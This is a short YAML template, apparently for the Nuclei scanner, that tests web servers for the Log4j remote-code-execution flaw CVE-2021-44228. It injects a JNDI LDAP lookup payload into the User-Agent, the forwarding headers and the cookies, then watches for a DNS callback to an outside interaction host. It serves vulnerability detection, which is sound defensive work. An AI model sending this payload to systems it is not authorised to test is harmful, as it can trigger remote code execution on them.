id: cve-2021-44228-log4j-rce

info:
  name: Log4j < 2.15.0 RCE (CVE-2021-44228)
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    Log4j versions below 2.15.0 are vulnerable to Remote Code Execution (RCE)
    through JNDI lookup. This template tests for the vulnerability.
  reference:
    - http://packetstormsecurity.com/files/165225/Apache-Log4j2-2.14.1-Remote-Code-Execution.html
    - http://www.openwall.com/lists/oss-security/2021/12/10/1
    - https://nosec.org/home/detail/4917.html

variables:
  ldap_url: "${jndi:ldap://{{interactsh-url}}}"

http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Safari/605.1.15;{{ldap_url}}
        X-Originating-IP: 127.0.0.1;{{ldap_url}}
        X-Forwarded-For: 127.0.0.1;{{ldap_url}}
        X-Remote-IP: 127.0.0.1;{{ldap_url}}
        X-Remote-Addr: 127.0.0.1;{{ldap_url}}
        Cookie: JSESSIONID={{ldap_url}};token={{ldap_url}}

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - dns

      - type: word
        part: interactsh_request
        words:
          - "127.0.0.1"
